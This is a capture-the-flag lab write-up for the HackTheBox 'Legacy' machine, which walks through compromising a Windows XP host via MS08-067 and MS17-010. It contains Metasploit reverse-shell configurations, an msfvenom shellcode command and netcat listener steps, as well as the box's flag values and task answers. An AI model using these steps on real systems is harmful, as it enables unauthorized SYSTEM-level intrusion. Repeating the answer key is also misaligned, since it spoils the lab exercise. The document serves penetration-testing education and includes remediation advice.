# HackTheBox — Legacy Writeup

> A beginner-friendly, step-by-step walkthrough of the retired **Legacy** machine.
> Legacy is one of the classic "starting point" boxes: an unpatched **Windows XP**
> host vulnerable to the infamous **MS08-067** SMB remote code execution flaw
> (and also to **MS17-010 / EternalBlue**). It's a great first look at how a single
> missing patch can hand an attacker full `SYSTEM` control.

---

## Machine Info

| Field | Value |
|-------|-------|
| **Name** | Legacy |
| **OS** | Windows XP |
| **Difficulty** | Easy |
| **Target IP** | `10.129.227.181` |
| **Attacker IP** (`tun0`) | `10.10.15.97` |

> **Note:** Your target IP will differ each time you spawn the box. Everywhere you
> see `10.129.227.181`, substitute your own target IP, and everywhere you see
> `10.10.15.97`, substitute your own VPN (`tun0`) IP. You can find your VPN IP with:
> ```bash
> ip addr show tun0
> ```

---

## Table of Contents

1. [Methodology Overview](#1-methodology-overview)
2. [Reconnaissance — Nmap](#2-reconnaissance--nmap)
3. [Understanding the Vulnerability](#3-understanding-the-vulnerability)
4. [Exploitation Path A — Metasploit (MS08-067)](#4-exploitation-path-a--metasploit-ms08-067)
5. [Exploitation Path B — Manual / Scripted](#5-exploitation-path-b--manual--scripted)
6. [Capturing the Flags](#6-capturing-the-flags)
7. [The Second Vulnerability — MS17-010 (EternalBlue)](#7-the-second-vulnerability--ms17-010-eternalblue)
8. [Task Answers Summary](#8-task-answers-summary)
9. [Remediation / Lessons Learned](#9-remediation--lessons-learned)
10. [Troubleshooting](#10-troubleshooting)

---

## 1. Methodology Overview

Every box follows the same broad flow. Keeping this loop in your head stops you
from getting lost:

```
Recon  ──►  Enumerate  ──►  Research  ──►  Exploit  ──►  Post-Exploit (loot flags)
```

For Legacy specifically:

1. **Recon** the open ports with Nmap.
2. **Enumerate** the SMB service and fingerprint the OS.
3. **Research** the OS/service for known CVEs.
4. **Exploit** MS08-067 to gain a shell as `NT AUTHORITY\SYSTEM`.
5. **Loot** the user and root flags.

---

## 2. Reconnaissance — Nmap

Start with a service + default-script scan so you can see *what's running* and
*which versions*:

```bash
nmap -sC -sV -oN legacy_initial.txt 10.129.227.181
```

**Flag breakdown:**

| Flag | Meaning |
|------|---------|
| `-sC` | Run Nmap's default NSE scripts (safe enumeration scripts) |
| `-sV` | Probe open ports to determine service/version info |
| `-oN`  | Save "normal" output to a file so you can refer back to it |

> **Tip:** For a more thorough sweep, scan **all** 65,535 ports first, then run a
> targeted service scan only on the ports you found:
> ```bash
> nmap -p- --min-rate 5000 -oN legacy_allports.txt 10.129.227.181
> nmap -p 135,139,445 -sC -sV -oN legacy_services.txt 10.129.227.181
> ```

### Expected Output

```
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds

Service Info: OSs: Windows, Windows XP;
CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

### What the scan tells us

- **3 open TCP ports**: `135`, `139`, `445`.
- **Port 135 (msrpc)** — Microsoft RPC endpoint mapper.
- **Port 139 (netbios-ssn)** — legacy NetBIOS session service.
- **Port 445 (microsoft-ds)** — modern **SMB** over TCP. This is our primary target.
- The banner explicitly flags the host as **Windows XP** — an end-of-life OS that
  has been unsupported since 2014. That's a giant red flag: unpatched XP is almost
  always vulnerable to MS08-067 and/or MS17-010.

> ❓ **Q: How many TCP ports are open on Legacy?**
> **A: 3**

### Optional: SMB-specific enumeration

You can confirm the SMB vulnerability directly with Nmap's vuln scripts:

```bash
nmap -p 139,445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 10.129.227.181
```

A result of `VULNERABLE` for `smb-vuln-ms08-067` confirms the path forward before
you even fire the exploit.

---

## 3. Understanding the Vulnerability

### The CVE

The 2008 SMB remote code execution vulnerability is **MS08-067**, tracked as:

> ❓ **Q: What is the 2008 CVE ID for a vulnerability in SMB that allows for remote code execution?**
> **A: CVE-2008-4250** (Microsoft bulletin **MS08-067**)

> ⚠️ You may see **CVE-2008-4835** mentioned in some notes — that is a *different*
> SMB advisory. The one that maps to the **MS08-067** "Server Service" RCE and to
> the Metasploit module below is **CVE-2008-4250**.

### What was actually vulnerable?

The flaw lived in the **Windows Server Service** — the process `svchost.exe`
hosting `srvsvc.dll`. The Server Service is responsible for:

- File sharing
- Printer sharing
- Network resource access
- Remote administration functions

It listens for requests over **SMB (Server Message Block)**, typically on:

- **TCP 139** (NetBIOS)
- **TCP 445** (direct SMB)

These ports are commonly exposed inside corporate networks, which is exactly why
MS08-067 became one of the most widely exploited vulnerabilities in history (the
Conficker worm spread through it).

### Why it leads to code execution

The Server Service handled a specially crafted RPC request to the
`NetPathCanonicalize()` function in `netapi32.dll` incorrectly, allowing a
**stack-based buffer overflow**. Because the Server Service runs with the highest
local privileges, a successful overflow yields code execution as
**`NT AUTHORITY\SYSTEM`** — no authentication required.

---

## 4. Exploitation Path A — Metasploit (MS08-067)

The most reliable route for beginners is the Metasploit module.

> ❓ **Q: What is the name of the Metasploit module that exploits CVE-2008-4250?**
> **A: `ms08_067_netapi`** (full path: `exploit/windows/smb/ms08_067_netapi`)

### Step 1 — Launch Metasploit

```bash
msfconsole
```

### Step 2 — Select and configure the module

```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.129.227.181
set LHOST 10.10.15.97
set LPORT 4444
```

Choose a payload. A staged Meterpreter reverse shell is the friendliest:

```
set payload windows/meterpreter/reverse_tcp
```

> **Tip:** If the staged Meterpreter payload behaves unreliably on this old OS, try
> a plain reverse shell instead:
> ```
> set payload windows/shell_reverse_tcp
> ```

### Step 3 — Verify settings and fire

```
show options
exploit
```

If everything is correct, you'll see the exploit send the payload and open a
session:

```
[*] Meterpreter session 1 opened (10.10.15.97:4444 -> 10.129.227.181:1030)
```

### Step 4 — Confirm your privileges

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> ❓ **Q: When exploiting MS08-067, what user does execution run as? Include the information before and after the `\`.**
> **A: `NT AUTHORITY\SYSTEM`**

`NT AUTHORITY\SYSTEM` is the highest-privileged local account on a Windows system —
effectively the Windows equivalent of `root` on Linux. There is no privilege
escalation needed on Legacy; the exploit lands you at the top immediately.

---

## 5. Exploitation Path B — Manual / Scripted

If you want to understand the box without leaning on Metasploit (recommended for
learning), you can use a standalone public exploit. A well-known Python port of
MS08-067 exists on GitHub.

> ⚠️ Only run public exploit code against machines you are **authorized** to test,
> such as HackTheBox lab targets. Read any script before running it.

### General workflow

1. **Generate shellcode** with `msfvenom` for a reverse shell:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.97 LPORT=443 \
     EXITFUNC=thread -f python -v shellcode
   ```
2. **Paste the shellcode** into the exploit script where indicated.
3. **Start a listener** on your attacker box:
   ```bash
   nc -lvnp 443
   ```
4. **Run the exploit**, selecting the correct target OS/language ID for Windows XP:
   ```bash
   python2 ms08-067.py 10.129.227.181 <target_id> 445
   ```
5. Catch the shell in your `nc` listener.

This path teaches you *why* the box falls, rather than just *that* it falls.

---

## 6. Capturing the Flags

Because Legacy runs Windows **XP**, user profiles live under
`C:\Documents and Settings\` (not `C:\Users\` like modern Windows).

### From a Meterpreter session

Drop into a system shell:

```
meterpreter > shell
```

Then read the flags:

```cmd
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

> **Tip:** If you're not sure of the exact path, search for the flag files:
> ```cmd
> dir /s /b C:\*user.txt
> dir /s /b C:\*root.txt
> ```

### Flags

> 🏁 **User flag (john):** `e69af0e4f443de7e36876fda4ec7644f`
> 🏁 **Root flag (Administrator):** `993442d258b0e0ec917cae9e695d5713`

> ⚠️ **Reminder:** The flag values above are from a specific spawn of the machine.
> HackTheBox flags **rotate**, so if these don't validate, read the current values
> off *your* target using the `type` commands above and submit those.

---

## 7. The Second Vulnerability — MS17-010 (EternalBlue)

Legacy's SMB stack is old enough that it's vulnerable to **two** separate famous
RCE bugs. Besides MS08-067, it's also exposed to the 2017 SMBv1 flaw better known
as **EternalBlue** — Microsoft bulletin **MS17-010**.

> ❓ **Q: In addition to MS08-067, Legacy's SMB service is also vulnerable to another remote code execution vulnerability with a CVE ID from 2017. What is that ID?**
> **A: `CVE-2017-0143`**

> ⚠️ **Common mistake:** `MS17-010` is the *bulletin* number, not a CVE. The
> question asks for the **CVE ID**, which is **CVE-2017-0143**. (The MS17-010
> bulletin actually covers a cluster of CVEs: **CVE-2017-0143** through
> **CVE-2017-0148**.)

### Exploiting EternalBlue with Metasploit (alternative path)

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.129.227.181
set LHOST 10.10.15.97
set payload windows/meterpreter/reverse_tcp
exploit
```

> **Note:** On very old / low-RAM XP targets, the classic `ms17_010_eternalblue`
> module can be unstable and occasionally BSOD the box. The
> `ms17_010_psexec` variant is generally gentler on Legacy. Either way, MS08-067
> is the intended and most reliable route for this machine.

---

## 8. Task Answers Summary

| # | Task | Answer |
|---|------|--------|
| 1 | How many TCP ports are open on Legacy? | **3** |
| 2 | 2008 CVE ID for the SMB RCE vulnerability | **CVE-2008-4250** |
| 3 | Metasploit module that exploits CVE-2008-4250 | **`ms08_067_netapi`** |
| 4 | User that execution runs as (before/after the `\`) | **`NT AUTHORITY\SYSTEM`** |
| 5 | User flag (john) | `e69af0e4f443de7e36876fda4ec7644f` |
| 6 | Root flag (Administrator) | `993442d258b0e0ec917cae9e695d5713` |
| 7 | 2017 CVE ID (EternalBlue / MS17-010) | **CVE-2017-0143** |

---

## 9. Remediation / Lessons Learned

Legacy is a museum piece, but the lessons are timeless:

- **Patch management is critical.** MS08-067 and MS17-010 both had patches
  available. A single missing update handed over full `SYSTEM` access.
- **Retire end-of-life operating systems.** Windows XP stopped receiving security
  updates in 2014. Running EOL systems on a network is an open door.
- **Disable SMBv1.** The legacy SMBv1 protocol is the attack surface for
  EternalBlue and should be disabled everywhere it isn't strictly required.
- **Segment and firewall SMB.** Ports 139/445 should never be broadly exposed;
  restrict them to trusted management networks.
- **Monitor for exploitation.** Both of these exploits have well-known network
  signatures that IDS/IPS can flag.

---

## 10. Troubleshooting

**Exploit runs but no session opens?**
- Double-check `LHOST` is your **VPN (`tun0`) IP**, not your local LAN IP.
- Make sure your VPN connection to the lab is active (`ping` the target first).
- Try the non-staged payload (`windows/shell_reverse_tcp`).

**`getuid` / commands hang after the session opens?**
- The XP target is slow. Give commands a few seconds. If Meterpreter is flaky,
  migrate to a stable process:
  ```
  meterpreter > ps
  meterpreter > migrate <PID_of_a_stable_process>
  ```

**Can't reach the target at all?**
- Confirm connectivity: `ping 10.129.227.181`
- Confirm SMB is up: `nmap -p 445 10.129.227.181`
- Re-check your VPN pack / that the machine is still spawned.

---

> ✍️ *Writeup for educational purposes on an authorized HackTheBox lab machine.*
> *Never run these techniques against systems you do not have explicit permission to test.*
